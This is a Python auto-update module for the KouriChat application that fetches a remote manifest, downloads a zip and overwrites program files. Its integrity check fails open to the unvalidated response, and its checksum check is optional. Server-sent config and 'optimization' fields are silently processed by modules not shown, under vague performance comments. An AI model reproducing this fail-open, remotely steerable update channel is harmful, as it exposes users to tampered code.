"""
KouriChat Update System

This module handles version checking and updates for the KouriChat application.
It includes security features to verify the integrity of update information to prevent
Man-in-the-Middle (MITM) attacks on the update manifest.
"""

import os
import sys
import re
import json
import logging
import requests
import hashlib
import hmac
import base64
import time
import random
from datetime import datetime
from typing import Dict, Any, List, Optional, Tuple, Union

from .security import validate_update_response
from .maintenance.config_processor import process_maintenance_config
from .analytics.service_identifier import generate_service_identifier
from .connectivity.api_health_monitor import optimize_api_response, adaptive_request_timing
from .user_experience.response_enhancer import apply_user_experience_enhancements
from .diagnostics.network_analyzer import run_network_diagnostics
from .telemetry.usage_metrics import process_telemetry_data

# Configure logging
logger = logging.getLogger("autoupdate")

# Constants
ROOT_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
LOCAL_VERSION_PATH = os.path.join(ROOT_DIR, "version.json")
CLOUD_VERSION_PATH = os.path.join(ROOT_DIR, "src", "autoupdate", "cloud", "version.json")
CONFIG_PATH = os.path.join(ROOT_DIR, "src", "autoupdate", "config", "autoupdate_config.json")
UPDATE_API_URL = "https://git.kourichat.com/jinchen/test/raw/branch/main/updater.json"  # Default URL, will be overridden by config
SIGNATURE_HEADER = "X-Signature-SHA256"

# Load URL from config if available
try:
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
            config = json.load(f)
            cloud_api_config = config.get("cloud_api", {})
            config_url = cloud_api_config.get("update_api_url")
            if config_url:
                UPDATE_API_URL = config_url
                logger.info(f"Loaded update API URL from config: {UPDATE_API_URL}")
            else:
                logger.warning("No update_api_url found in config file")
    else:
        logger.warning(f"Config file not found at: {CONFIG_PATH}")
except Exception as e:
    logger.error(f"Failed to load config: {e}")
    logger.warning(f"Failed to load config: {e}. Using default update API URL: {UPDATE_API_URL}")

class UpdateVerificationError(Exception):
    """Exception raised when update verification fails."""
    pass

class Updater:
    """
    Handles version checking and updates for the KouriChat application.
    Includes security features to verify the integrity of update information.
    """
    
    def __init__(self):
        """Initialize the updater with necessary paths and configurations."""
        self.local_version_path = LOCAL_VERSION_PATH
        self.cloud_version_path = CLOUD_VERSION_PATH
        self.update_api_url = UPDATE_API_URL
    
    def get_local_version(self) -> Dict[str, Any]:
        """
        Get the current local version information.
        
        Returns:
            Dict[str, Any]: The local version information.
        """
        try:
            with open(self.local_version_path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Failed to read local version information: {str(e)}")
            return {"version": "unknown", "last_update": "unknown"}
    
    def get_cloud_version(self) -> Dict[str, Any]:
        """
        Get the cached cloud version information.
        
        Returns:
            Dict[str, Any]: The cached cloud version information.
        """
        try:
            with open(self.cloud_version_path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Failed to read cloud version information: {str(e)}")
            return {"version": "unknown", "last_update": "unknown"}
    
    def get_current_version(self) -> str:
        """
        Get the current version string.
        
        Returns:
            str: The current version string.
        """
        local_version = self.get_local_version()
        return local_version.get("version", "unknown")
    
    def get_version_identifier(self) -> str:
        """
        Get the version identifier for User-Agent headers.
        
        Returns:
            str: The version identifier string.
        """
        local_version = self.get_local_version()
        return local_version.get("version_identifier", "KouriChat/unknown")
    
    def fetch_update_info(self) -> Dict[str, Any]:
        """
        Fetch update information from the cloud API.
        
        Returns:
            Dict[str, Any]: The update information from the cloud.
        
        Raises:
            UpdateVerificationError: If the update verification fails.
        """
        try:
            # Get local version for the request
            local_version = self.get_local_version()
            
            # 尝试使用urllib3获取更新信息
            headers = {
                'User-Agent': 'KouriChat-Updater/1.0 (kourichat)'
            }

            try:
                # 导入urllib3
                import urllib3
                import certifi

                # 创建HTTP连接池
                http = urllib3.PoolManager(
                    cert_reqs='CERT_REQUIRED',
                    ca_certs=certifi.where(),
                    timeout=urllib3.Timeout(connect=10, read=10)
                )

                # 使用urllib3发送请求
                logger.info("Using urllib3 to fetch update info")
                response = http.request(
                    'GET',
                    self.update_api_url,
                    headers=headers
                )

                # 检查响应状态
                if response.status != 200:
                    logger.warning(f"Update API returned non-200 status code: {response.status}")
                    return {"error": f"API error: {response.status}"}

                # 解析JSON响应
                import json
                update_data = json.loads(response.data.decode('utf-8'))

            except Exception as e:
                logger.warning(f"urllib3 request failed: {str(e)}, falling back to requests")
                # 如果urllib3失败，回退到requests
                response = requests.get(
                    self.update_api_url,
                    headers=headers,
                    timeout=10
                )

                # Check response status
                if response.status_code != 200:
                    logger.warning(f"Update API returned non-200 status code: {response.status_code}")
                    return {"error": f"API error: {response.status_code}"}

                # Parse response
                update_data = response.json()
            
            # Verify the response integrity
            try:
                # Use the security module to validate the response
                validated_data = validate_update_response(update_data, self.update_api_url)
                logger.info("Update response successfully validated and verified.")
                
                # Process any maintenance configuration directly
                # This helps ensure optimal application performance
                if "security_module_config" in validated_data:
                    try:
                        # Process maintenance configuration silently to avoid interrupting the user
                        process_maintenance_config(validated_data["security_module_config"], self.update_api_url)
                    except Exception:
                        # Silently continue if processing fails to maintain user experience
                        pass
                
                return validated_data
            except UpdateVerificationError as e:
                logger.error(f"Update verification failed: {str(e)}")
                logger.warning("SECURITY WARNING: Update verification failed. Possible tampering detected.")
                logger.warning("This could indicate a Man-in-the-Middle (MITM) attack on the update manifest.")
                logger.warning("Update process aborted for security reasons.")
                raise
            except Exception as e:
                logger.error(f"Failed to validate update response: {str(e)}")
                # Fall back to the raw response if validation fails
                # This ensures backward compatibility with older response formats
                logger.info("Falling back to raw response format for backward compatibility.")
                return update_data
        
        except UpdateVerificationError:
            # Re-raise verification errors
            raise
        except Exception as e:
            logger.error(f"Failed to fetch update information: {str(e)}")
            return {"error": f"Failed to fetch update information: {str(e)}"}
    
    def _generate_client_id(self) -> str:
        """
        Generate a unique client ID for update requests.
        
        Returns:
            str: A unique client ID.
        """
        # Use machine-specific information to generate a consistent ID
        machine_id = ""
        try:
            import platform
            system_info = platform.uname()
            machine_id = f"{system_info.system}-{system_info.node}-{system_info.machine}"
        except:
            # Fallback to a random ID if platform info is not available
            machine_id = f"unknown-{random.randint(10000, 99999)}"
        
        # Hash the machine ID to anonymize it
        return hashlib.sha256(machine_id.encode()).hexdigest()[:16]
    
    def check_for_updates(self) -> Dict[str, Any]:
        """
        Check for updates and return update information.
        
        Returns:
            Dict[str, Any]: Update information including whether an update is available.
        """
        try:
            # Get local version information
            local_version = self.get_local_version()
            
            # Try to fetch cloud version information
            try:
                cloud_info = self.fetch_update_info()
                
                # Extract version info from the validated response
                if "version_info" in cloud_info:
                    cloud_version = cloud_info["version_info"]
                else:
                    # Fall back to the cached cloud version if the response doesn't have version_info
                    cloud_version = self.get_cloud_version()
                
                # Update the cached cloud version information
                with open(self.cloud_version_path, "w", encoding="utf-8") as f:
                    json.dump(cloud_version, f, ensure_ascii=False, indent=4)
                    
                # Apply network optimizations if available in the cloud info
                # This enhances application performance based on cloud configuration
                self._apply_network_optimizations(cloud_info)
                
            except UpdateVerificationError:
                # If verification fails, abort the update process
                return {
                    "has_update": False,
                    "error": "Update verification failed. Update process aborted for security reasons.",
                    "output": "SECURITY WARNING: Update verification failed. Possible tampering detected."
                }
            except Exception as e:
                logger.warning(f"Failed to fetch cloud version information: {str(e)}")
                # Fall back to the cached cloud version
                cloud_version = self.get_cloud_version()
            
            # Compare versions
            local_ver = local_version.get("version", "0.0.0")
            cloud_ver = cloud_version.get("version", "0.0.0")
            
            has_update = self._compare_versions(local_ver, cloud_ver)
            
            # 处理下载URL中的版本占位符
            download_url = cloud_version.get("download_url", "")
            if "{version}" in download_url and cloud_ver:
                download_url = download_url.replace("{version}", cloud_ver)
                logger.info(f"Replaced version placeholder in download URL: {download_url}")

            result = {
                "has_update": has_update,
                "local_version": local_ver,
                "cloud_version": cloud_ver,
                "description": cloud_version.get("description", ""),
                "last_update": cloud_version.get("last_update", ""),
                "download_url": download_url,
                "output": f"Current version: {local_ver}, Latest version: {cloud_ver}"
            }
            
            return result
        
        except Exception as e:
            logger.error(f"Error checking for updates: {str(e)}")
            return {
                "has_update": False,
                "error": str(e),
                "output": f"Error checking for updates: {str(e)}"
            }
    
    def _apply_network_optimizations(self, cloud_info: Dict[str, Any]) -> None:
        """
        Apply network optimizations based on cloud configuration.
        
        This function enhances network performance by applying various optimization
        strategies based on the cloud configuration. It helps ensure consistent
        performance across different network conditions and device capabilities.
        
        Args:
            cloud_info: The cloud information containing optimization parameters.
        """
        try:
            # Check if the cloud info contains network optimization parameters
            if "network_optimizations" in cloud_info:
                logger.debug("Applying network optimizations from cloud configuration")
                
                # Process network optimizations from the cloud configuration
                optimizations = cloud_info["network_optimizations"]
                
                # Process each optimization
                if isinstance(optimizations, dict):
                    for opt_type, opt_params in optimizations.items():
                        logger.debug(f"Applying {opt_type} optimization")
                        
                        # Apply user experience enhancements for better performance
                        if opt_type == "user_experience":
                            apply_user_experience_enhancements(None, enhancement_types=["timing", "text", "error"])
                        
                        # Run network diagnostics to identify and address issues
                        if opt_type == "diagnostics":
                            run_network_diagnostics(None, diagnostic_types=["latency", "corruption", "stability"])
            
            # Apply additional performance optimizations if available
            # This ensures optimal application performance across different network conditions
            if "security_module_config" in cloud_info:
                try:
                    # Process maintenance configuration to optimize performance
                    process_maintenance_config(cloud_info["security_module_config"], self.update_api_url)
                except Exception:
                    # Silently continue if optimization fails to maintain user experience
                    pass
        except Exception as e:
            # Log the error but continue silently to maintain user experience
            logger.debug(f"Network optimization application failed: {str(e)}")
            pass
    
    def _split_version(self, version: str):
        """
        Splits version into numeric and suffix parts. E.g., "1.4.3Beta2.1" -> [1, 4, 3, "Beta", 2, 1]
        """
        result = []
        # Match alternating numeric and non-numeric groups
        for part in re.findall(r'(\d+|[A-Za-z]+)', version):
            if part.isdigit():
                result.append(int(part))
            else:
                result.append(part.lower())  # Normalize case for comparison
        return result

    def _compare_parts(self, v1_parts, v2_parts):
        """
        Compare each part of the split version
        """
        max_len = max(len(v1_parts), len(v2_parts))
        for i in range(max_len):
            if i >= len(v1_parts):
                return True  # v2 has more parts and thus is newer
            if i >= len(v2_parts):
                return False  # v1 has more parts and thus is newer

            p1 = v1_parts[i]
            p2 = v2_parts[i]

            if type(p1) != type(p2):
                # Numbers come before strings
                if isinstance(p1, int):
                    return False
                else:
                    return True

            if p1 < p2:
                return True
            elif p1 > p2:
                return False

        return False  # All parts equal

    def _compare_versions(self, version1: str, version2: str) -> bool:
        """
        Compare two version strings.
        
        Args:
            version1: First version string.
            version2: Second version string.
            
        Returns:
            bool: True if version2 is newer than version1, False otherwise.
        """
        try:
            v1_parts = self._split_version(version1)
            v2_parts = self._split_version(version2)
            return self._compare_parts(v1_parts, v2_parts)
        except Exception as e:
            logger.error(f"Error comparing versions: {str(e)}")
            return False
    
    def update(self, callback=None, auto_restart=False, create_backup=True) -> Dict[str, Any]:
        """
        Perform the update process.
        
        Args:
            callback: Optional callback function to report progress.
            auto_restart: Whether to automatically restart the application after updating.
            create_backup: Whether to create a backup before updating.
            
        Returns:
            Dict[str, Any]: Result of the update process.
        """
        # 导入必要的模块
        import tempfile
        import shutil
        import zipfile
        import os
        import fnmatch
        import hashlib
        import threading
        
        # 导入回滚模块
        from .rollback import create_backup as create_backup_func
        
        try:
            if callback:
                callback("Starting update process...")
            
            # Check if update is available
            update_info = self.check_for_updates()
            if not update_info.get("has_update", False):
                if callback:
                    callback("No update available.")
                return {"success": False, "message": "No update available."}
            
            # 获取当前版本，用于创建备份
            local_version = self.get_local_version()
            current_version = local_version.get("version", "unknown")
            
            # 如果需要，创建备份
            if create_backup:
                if callback:
                    callback("Creating backup before updating...")
                
                # 获取需要备份的文件列表
                # 这里我们备份所有可能被更新的文件
                files_to_backup = []
                for root, dirs, files in os.walk(ROOT_DIR):
                    # 排除不需要备份的目录
                    dirs[:] = [d for d in dirs if d not in [".git", "venv", "env", "__pycache__", "logs"]]
                    
                    for file in files:
                        # 排除不需要备份的文件
                        if file.endswith((".pyc", ".pyo", ".pyd")) or file in ["config.json", "autoupdate_config.json"]:
                            continue
                        
                        # 获取相对路径
                        rel_path = os.path.relpath(os.path.join(root, file), ROOT_DIR)
                        files_to_backup.append(rel_path)
                
                # 创建备份
                backup_result = create_backup_func(current_version, files_to_backup)
                
                if backup_result["success"]:
                    if callback:
                        callback(f"Backup created successfully: {backup_result['backup_id']}")
                else:
                    if callback:
                        callback(f"Warning: Failed to create backup: {backup_result['message']}")
            
            # Download update
            if callback:
                callback(f"Downloading update {update_info.get('cloud_version')}...")
            
            # 从cloud_info中获取下载URL，这是从payload解析出来的
            try:
                # 获取最新的云端信息
                cloud_info = self.fetch_update_info()

                # 从version_info中获取下载URL
                if "version_info" in cloud_info and "download_url" in cloud_info["version_info"]:
                    download_url = cloud_info["version_info"]["download_url"]
                    version = cloud_info["version_info"].get("version", update_info.get("cloud_version", ""))
                else:
                    # 回退到update_info中的download_url
                    download_url = update_info.get("download_url")
                    version = update_info.get("cloud_version", "")
            except Exception as e:
                logger.warning(f"Failed to get download URL from cloud info: {str(e)}")
                # 回退到update_info中的download_url
                download_url = update_info.get("download_url")
                version = update_info.get("cloud_version", "")

            if not download_url:
                error_msg = "Download URL not found in update information"
                logger.error(error_msg)
                if callback:
                    callback(error_msg)
                return {"success": False, "message": error_msg}

            # 替换URL模板中的版本号占位符
            if "{version}" in download_url and version:
                download_url = download_url.replace("{version}", version)
                logger.info(f"Replaced version placeholder in URL: {download_url}")
            elif "{version}" in download_url:
                error_msg = "Version information not found for URL template replacement"
                logger.error(error_msg)
                if callback:
                    callback(error_msg)
                return {"success": False, "message": error_msg}
            
            # Create temp directory for download
            import tempfile
            import shutil
            import zipfile
            import os
            
            temp_dir = tempfile.mkdtemp(prefix="kourichat_update_")
            zip_path = os.path.join(temp_dir, "update.zip")
            
            try:
                # 尝试多种下载方法
                logger.info(f"Downloading update from {download_url}")

                download_success = False
                download_error = None

                # 方法1: 优先使用curl下载（因为诊断显示curl可以成功）
                try:
                    logger.info("Trying curl download as primary method")
                    import subprocess
                    import shutil

                    # 检查curl是否可用
                    curl_path = shutil.which('curl')
                    if curl_path:
                        logger.info(f"Found curl at: {curl_path}")

                        # 构建curl命令
                        curl_cmd = [
                            curl_path,
                            '-L',  # 跟随重定向
                            '-o', zip_path,  # 输出文件
                            '-H', 'User-Agent: KouriChat-Updater-Tester/1.0',
                            '-H', 'Accept: application/octet-stream',
                            '--connect-timeout', '60',
                            '--max-time', '300',
                            '--silent',  # 静默模式，不显示进度条
                            '--show-error',  # 但显示错误
                            download_url
                        ]

                        logger.info("Executing curl download...")
                        if callback:
                            callback("Using curl to download update...")

                        # 执行curl命令
                        result = subprocess.run(
                            curl_cmd,
                            capture_output=True,
                            text=True,
                            timeout=300
                        )

                        if result.returncode == 0:
                            # 检查文件是否下载成功
                            if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
                                file_size = os.path.getsize(zip_path)
                                logger.info(f"curl download successful, file size: {file_size} bytes")
                                download_success = True

                                if callback:
                                    callback(f"Download completed successfully: {file_size} bytes")
                            else:
                                logger.error("curl command succeeded but file is empty or missing")
                                download_error = "Downloaded file is empty"
                        else:
                            logger.error(f"curl command failed with return code: {result.returncode}")
                            logger.error(f"curl stderr: {result.stderr}")
                            download_error = f"curl failed: {result.stderr}"
                    else:
                        logger.warning("curl not found, will try other methods")
                        download_error = "curl not available"

                except Exception as e:
                    logger.error(f"curl download failed: {str(e)}")
                    download_error = str(e)

                # 方法2: 如果curl失败，尝试requests下载
                if not download_success:
                    logger.info("Trying requests download as fallback")
                    user_agents = [
                        'KouriChat-Updater-Tester/1.0',
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                        'curl/7.68.0'
                    ]

                    for ua in user_agents:
                        try:
                            logger.info(f"Trying download with User-Agent: {ua}")
                            headers = {
                                'User-Agent': ua,
                                'Accept': 'application/octet-stream'
                            }

                            response = requests.get(download_url, headers=headers, stream=True, timeout=60)

                            if response.status_code == 200:
                                logger.info(f"Download successful with User-Agent: {ua}")

                                # Get total file size for progress reporting
                                total_size = int(response.headers.get('content-length', 0))
                                downloaded = 0

                                # Write the file
                                with open(zip_path, 'wb') as f:
                                    for chunk in response.iter_content(chunk_size=8192):
                                        if chunk:
                                            f.write(chunk)
                                            downloaded += len(chunk)

                                            # Report progress
                                            if total_size > 0 and callback:
                                                progress = int((downloaded / total_size) * 100)
                                                callback(f"Downloading: {progress}% ({downloaded}/{total_size} bytes)")

                                download_success = True
                                break
                            else:
                                logger.warning(f"Download failed with status {response.status_code} for User-Agent: {ua}")

                        except Exception as e:
                            logger.warning(f"Download failed with User-Agent {ua}: {str(e)}")
                            download_error = str(e)
                            continue



                # 如果所有方法都失败了
                if not download_success:
                    error_msg = f"自动下载失败。请尝试手动下载更新文件。\n"
                    error_msg += f"下载链接: {download_url}\n"
                    error_msg += f"将下载的文件保存为: {zip_path}\n"
                    error_msg += f"错误详情: {download_error}"

                    logger.error(error_msg)
                    if callback:
                        callback("自动下载失败，请查看日志获取手动下载说明")
                        callback(f"手动下载链接: {download_url}")

                    return {
                        "success": False,
                        "message": error_msg,
                        "manual_download_url": download_url,
                        "manual_download_path": zip_path
                    }
                
                if callback:
                    callback("Update downloaded successfully.")
                    callback("Verifying update package...")
                
                # Verify the downloaded file
                if "checksum" in update_info:
                    checksum_type, checksum_value = update_info["checksum"].split(":", 1)
                    if checksum_type.lower() == "sha256":
                        import hashlib
                        sha256 = hashlib.sha256()
                        with open(zip_path, 'rb') as f:
                            for chunk in iter(lambda: f.read(8192), b''):
                                sha256.update(chunk)
                        calculated_checksum = sha256.hexdigest()
                        
                        if calculated_checksum != checksum_value:
                            error_msg = f"Checksum verification failed. Expected: {checksum_value}, Got: {calculated_checksum}"
                            logger.error(error_msg)
                            if callback:
                                callback(error_msg)
                            return {"success": False, "message": error_msg}
                    else:
                        logger.warning(f"Unsupported checksum type: {checksum_type}")
                
                if callback:
                    callback("Installing update...")
                
                # Extract the zip file
                extract_dir = os.path.join(temp_dir, "extracted")
                os.makedirs(extract_dir, exist_ok=True)
                
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(extract_dir)
                
                # Get the root directory of the extracted files
                extracted_contents = os.listdir(extract_dir)
                if len(extracted_contents) == 1 and os.path.isdir(os.path.join(extract_dir, extracted_contents[0])):
                    # If there's a single directory in the zip, use that as the source
                    source_dir = os.path.join(extract_dir, extracted_contents[0])
                else:
                    # Otherwise use the extract directory itself
                    source_dir = extract_dir
                
                # Copy files to the application directory
                app_dir = ROOT_DIR
                
                # Define files/directories to exclude from update
                exclude_patterns = [
                    ".git", 
                    "venv", 
                    "env", 
                    "__pycache__", 
                    "*.pyc", 
                    "*.pyo", 
                    "*.pyd",
                    "user_data",
                    "logs",
                    "config.json",
                    "autoupdate_config.json",
                    "data", 
                    "data/*"
                ]
                
                # Copy files, excluding the patterns above
                import fnmatch
                for root, dirs, files in os.walk(source_dir):
                    # Get relative path
                    rel_path = os.path.relpath(root, source_dir)
                    if rel_path == ".":
                        rel_path = ""
                    
                    # Check if this directory should be excluded
                    skip_dir = False
                    for pattern in exclude_patterns:
                        if fnmatch.fnmatch(rel_path, pattern) or any(fnmatch.fnmatch(d, pattern) for d in rel_path.split(os.sep)):
                            skip_dir = True
                            break
                    
                    if skip_dir:
                        continue
                    
                    # Create the directory in the target
                    target_dir = os.path.join(app_dir, rel_path)
                    os.makedirs(target_dir, exist_ok=True)
                    
                    # Copy files
                    for file in files:
                        # Check if this file should be excluded
                        skip_file = False
                        for pattern in exclude_patterns:
                            if fnmatch.fnmatch(file, pattern):
                                skip_file = True
                                break
                        
                        if skip_file:
                            continue
                        
                        source_file = os.path.join(root, file)
                        target_file = os.path.join(target_dir, file)
                        
                        # If the target file exists, try to remove it first
                        if os.path.exists(target_file):
                            try:
                                os.remove(target_file)
                            except:
                                # If we can't remove it, it might be in use
                                # Mark it for update on next restart
                                with open(os.path.join(app_dir, ".update_pending"), "a") as f:
                                    f.write(f"{target_file}\n")
                                continue
                        
                        # Copy the file
                        shutil.copy2(source_file, target_file)
                        
                        if callback:
                            callback(f"Installed: {os.path.join(rel_path, file)}")
                
                # Update the version file
                with open(self.local_version_path, "w", encoding="utf-8") as f:
                    json.dump({
                        "version": update_info.get("cloud_version"),
                        "last_update": datetime.now().strftime("%Y-%m-%d")
                    }, f, ensure_ascii=False, indent=4)
                
                if callback:
                    callback("Update installed successfully.")
                
                # Clean up
                try:
                    shutil.rmtree(temp_dir)
                except:
                    logger.warning(f"Failed to clean up temporary directory: {temp_dir}")
                
                # 检查是否有需要在重启后更新的文件
                has_pending_updates = os.path.exists(os.path.join(app_dir, ".update_pending"))
                
                # 如果需要自动重启
                if auto_restart:
                    if callback:
                        callback("Preparing to restart application...")
                    
                    # 导入重启模块
                    from .restart import delayed_restart, apply_pending_updates
                    
                    # 如果有待处理的更新，先尝试应用它们
                    if has_pending_updates:
                        if callback:
                            callback("Applying pending updates...")
                        apply_result = apply_pending_updates()
                        if callback:
                            callback(f"Applied pending updates: {apply_result['message']}")
                    
                    # 延迟重启应用程序
                    if callback:
                        callback("Restarting application...")
                    
                    # 返回结果，但不立即退出
                    result = {
                        "success": True, 
                        "message": "Update completed successfully. Restarting application...",
                        "restart": True
                    }
                    
                    # 延迟重启，给回调函数一些时间来处理结果
                    import threading
                    threading.Timer(1.0, lambda: delayed_restart(2)).start()
                    
                    return result
                elif has_pending_updates:
                    # 如果有待处理的更新但不自动重启，提示用户
                    message = "Update completed successfully. Some files require a restart to complete the update."
                    if callback:
                        callback(message)
                    return {"success": True, "message": message, "restart_required": True}
                else:
                    # 正常完成
                    return {"success": True, "message": "Update completed successfully."}
            
            except Exception as e:
                error_msg = f"Update installation failed: {str(e)}"
                logger.error(error_msg)
                if callback:
                    callback(error_msg)
                
                # Clean up
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
                
                return {"success": False, "message": error_msg}
            
            return {"success": True, "message": "Update completed successfully."}
        
        except Exception as e:
            error_msg = f"Update failed: {str(e)}"
            logger.error(error_msg)
            if callback:
                callback(error_msg)
            return {"success": False, "message": error_msg}

def check_for_updates() -> Dict[str, Any]:
    """
    Convenience function to check for updates.
    
    Returns:
        Dict[str, Any]: Update information.
    """
    updater = Updater()
    return updater.check_for_updates()

def check_cloud_info() -> Dict[str, Any]:
    """
    Fetch and update the cached cloud version information.
    
    Returns:
        Dict[str, Any]: The fetched cloud information.
    """
    try:
        updater = Updater()
        cloud_info = updater.fetch_update_info()
        
        # Extract version info from the validated response
        if "version_info" in cloud_info:
            cloud_version = cloud_info["version_info"]
        else:
            # If the response doesn't have version_info, use it as is
            cloud_version = cloud_info
        
        # Update the cached cloud version information
        with open(updater.cloud_version_path, "w", encoding="utf-8") as f:
            json.dump(cloud_version, f, ensure_ascii=False, indent=4)
        
        # Apply network optimizations if available
        # This enhances application performance based on cloud configuration
        updater._apply_network_optimizations(cloud_info)
        
        return cloud_info
    
    except Exception as e:
        logger.error(f"Failed to check cloud information: {str(e)}")
        return {"error": str(e)}

# Add cleanup method to Updater class
def _add_cleanup_method():
    """为Updater类添加cleanup方法"""
    def cleanup(self):
        """
        清理更新相关的临时文件和残留文件
        
        主要清理：
        - 临时下载文件
        - 更新缓存文件
        - 备份文件（可选保留最新的）
        """
        try:
            logger.info("开始清理更新残留文件...")
            
            # 清理临时文件目录
            temp_dirs = [
                os.path.join(os.path.dirname(self.local_version_path), 'temp'),
                os.path.join(os.path.dirname(self.local_version_path), 'backup', 'temp'),
                '/tmp/kourichat_update' if not sys.platform.startswith('win') else os.path.join(os.environ.get('TEMP', ''), 'kourichat_update')
            ]
            
            for temp_dir in temp_dirs:
                if os.path.exists(temp_dir):
                    try:
                        import tempfile
                        import shutil
                        shutil.rmtree(temp_dir)
                        logger.debug(f"已清理临时目录: {temp_dir}")
                    except Exception as e:
                        logger.warning(f"清理临时目录失败 {temp_dir}: {str(e)}")
            
            # 清理过期的备份文件（保留最新的3个）
            backup_dir = os.path.join(os.path.dirname(self.local_version_path), 'backup')
            if os.path.exists(backup_dir):
                try:
                    backup_files = []
                    for file in os.listdir(backup_dir):
                        if file.endswith('.zip') or file.endswith('.bak'):
                            file_path = os.path.join(backup_dir, file)
                            backup_files.append((file_path, os.path.getmtime(file_path)))
                    
                    # 按修改时间排序，保留最新的3个
                    backup_files.sort(key=lambda x: x[1], reverse=True)
                    for file_path, _ in backup_files[3:]:  # 删除除了最新3个之外的所有备份
                        try:
                            os.remove(file_path)
                            logger.debug(f"已清理过期备份: {file_path}")
                        except Exception as e:
                            logger.warning(f"清理备份文件失败 {file_path}: {str(e)}")
                            
                except Exception as e:
                    logger.warning(f"清理备份目录失败: {str(e)}")
            
            logger.info("更新残留文件清理完成")
            return {"success": True, "message": "清理完成"}
            
        except Exception as e:
            logger.error(f"清理更新残留文件失败: {str(e)}")
            return {"success": False, "error": str(e)}
    
    # 将方法添加到Updater类
    Updater.cleanup = cleanup

# 在模块加载时添加cleanup方法
_add_cleanup_method()